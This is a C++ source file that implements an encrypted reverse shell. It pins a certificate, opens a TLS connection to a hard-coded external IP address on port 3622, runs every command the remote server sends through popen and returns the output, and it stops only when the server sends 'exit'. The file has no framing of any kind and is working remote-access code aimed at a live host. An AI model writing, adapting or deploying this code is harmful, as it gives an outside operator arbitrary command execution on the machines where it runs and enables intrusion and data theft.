#include <openssl/ssl.h>
#include <openssl/err.h>
#include <iostream>
#include <cstring>
#include <unistd.h>
#include <arpa/inet.h>
#include <fstream>
#include <array>
#include <memory>
#include <cstdlib>

const char *server_cert =
"-----BEGIN CERTIFICATE-----\n"
"MIIDbTCCAlWgAwIBAgIUAv/b7yyAuJBKMqawLExrNbIhfZYwDQYJKoZIhvcNAQEL\n"
"BQAwRTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUxITAfBgNVBAoM\n"
"GEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDAgFw0yNTA5MTcyMDQwMDlaGA8yMTI1\n"
"MDgyNDIwNDAwOVowRTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUx\n"
"ITAfBgNVBAoMGEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDCCASIwDQYJKoZIhvcN\n"
"AQEBBQADggEPADCCAQoCggEBAMzvZh0LviyHk7rmgWp9lF874ZbVOdTM3VMG8ayG\n"
"Y/AsCEA7ngIcMH8Houf72PYIYER45ewwfWIBA7IM+CLEX7Iy1QeaBurOMVg4xWs+\n"
"MqA8t+xokepUtWjIFp/jTy5iFjIe5OvpZtaCgfxyWFVrYFwBDS/TNjC13skfluYk\n"
"o3zQAEclQzF+Sno02NVa3kc6BscA/3vw3AtrSMpbPsmgKwZ+GPcV7JqETKda4GXc\n"
"LDO8v4ddqLW8wmA/NgRNvXyTSgqkT9n+VkZJwETv4uK8Ec3qenzBmumx1CvN6hQd\n"
"IZIuBM9PCDAOXmyVeKbxc6lrh4CHH7KgTMsPK39cbHyuVMUCAwEAAaNTMFEwHQYD\n"
"VR0OBBYEFGCCnUpQj3r7oLCbr9maghWHMgsiMB8GA1UdIwQYMBaAFGCCnUpQj3r7\n"
"oLCbr9maghWHMgsiMA8GA1UdEwEB/wQFMAMBAf8wDQYJKoZIhvcNAQELBQADggEB\n"
"ACGeM/CmXCZzMwmiiyxPxfQdIuEonponvQyobYINFpv6ouTniTSaF54d5TNvXgny\n"
"Pjuoz6VfYvJL9qgIrVsUViouXkRO5my9x+v1eKSTmBEyuIgcHHPq+OTpKk1x486v\n"
"ws5H/jCv8AYo/G6QsRczBQnDrUvo1PYYo3GCRlWeG3m6zIuHm37R/yo/G8vBHzg/\n"
"8Ks8w70pwno/EdXooVUiNrUuMaNq6+b5xWEbWzDp1odRqoTULcGptkQWwIeaDnwU\n"
"uTU+2SO8Jrc5d0Woy8wRmenxdXDrOLAcTOr/yH1NSaEaVm4GRegwwmOcd92mgYx3\n"
"Z3rNVExFIR+qN5y+wjJWaIk=\n"
"-----END CERTIFICATE-----\n";

std::string write_temp_cert() {
    std::string cert_path = "/tmp/server_cert.pem";
    std::ofstream cert_file(cert_path);
    if (!cert_file) {
        perror("Unable to create temporary certificate file");
        exit(EXIT_FAILURE);
    }
    cert_file << server_cert;
    cert_file.close();
    return cert_path;
}

void initialize_openssl() {
    SSL_load_error_strings();
    OpenSSL_add_ssl_algorithms();
}

void cleanup_openssl() {
    EVP_cleanup();
}

SSL_CTX *create_context() {
    const SSL_METHOD *method;
    SSL_CTX *ctx;

    method = TLS_client_method();
    ctx = SSL_CTX_new(method);
    if (!ctx) {
        perror("Unable to create SSL context");
        ERR_print_errors_fp(stderr);
        exit(EXIT_FAILURE);
    }

    SSL_CTX_set_options(ctx, SSL_OP_NO_SSLv2 | SSL_OP_NO_SSLv3 | SSL_OP_NO_TLSv1 | SSL_OP_NO_TLSv1_1);

    return ctx;
}

void load_server_certificate(SSL_CTX *ctx) {
    std::string cert_path = write_temp_cert();

    if (SSL_CTX_load_verify_locations(ctx, cert_path.c_str(), NULL) != 1) {
        ERR_print_errors_fp(stderr);
        std::remove(cert_path.c_str());
        exit(EXIT_FAILURE);
    }

    std::remove(cert_path.c_str());
}

std::string execute_command(const std::string &command) {
    std::array<char, 128> buffer;
    std::string result;

    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(command.c_str(), "r"), pclose);
    if (!pipe) {
        return "Error: Unable to open pipe.";
    }

    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }

    if (result.empty()) {
        return "Error: Command not found or execution failed.";
    }

    return result;
}

int main() {
    const char* server_address = "159.54.144.118";
    int port = 3622;

    initialize_openssl();

    SSL_CTX *ctx = create_context();
    load_server_certificate(ctx);

    SSL *ssl = SSL_new(ctx);
    if (!ssl) {
        perror("Unable to create SSL structure");
        ERR_print_errors_fp(stderr);
        SSL_CTX_free(ctx);
        cleanup_openssl();
        return EXIT_FAILURE;
    }

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("Unable to create socket");
        SSL_free(ssl);
        SSL_CTX_free(ctx);
        cleanup_openssl();
        exit(EXIT_FAILURE);
    }

    struct sockaddr_in addr;
    std::memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);

    if (inet_pton(AF_INET, server_address, &addr.sin_addr) <= 0) {
        std::cerr << "Invalid address/ Address not supported: " << server_address << "\n";
        close(sockfd);
        SSL_free(ssl);
        SSL_CTX_free(ctx);
        cleanup_openssl();
        exit(EXIT_FAILURE);
    }

    if (connect(sockfd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        perror("Connection failed");
        close(sockfd);
        SSL_free(ssl);
        SSL_CTX_free(ctx);
        cleanup_openssl();
        exit(EXIT_FAILURE);
    }

    SSL_set_fd(ssl, sockfd);

    if (SSL_connect(ssl) <= 0) {
        ERR_print_errors_fp(stderr);
    } else {
        std::cout << "Connected to server " << server_address << ":" << port << "!\n";

        while (true) {
            char buffer[1024] = {0};
            int bytes = SSL_read(ssl, buffer, sizeof(buffer) - 1);
            if (bytes > 0) {
                buffer[bytes] = '\0'; 
                std::string command(buffer);

                if (command == "exit") {
                    std::cout << "Exiting client.\n";
                    break;
                }

                std::string output = execute_command(command);

                if (SSL_write(ssl, output.c_str(), output.length()) <= 0) {
                    std::cerr << "Error writing to server.\n";
                    break;
                }
            } else if (bytes == 0) {
                std::cout << "Server closed the connection.\n";
                break;
            } else {
                std::cerr << "Error reading from server.\n";
                break;
            }
        }
    }

    SSL_shutdown(ssl);
    SSL_free(ssl);
    close(sockfd);
    SSL_CTX_free(ctx);
    cleanup_openssl();
    return 0;
}
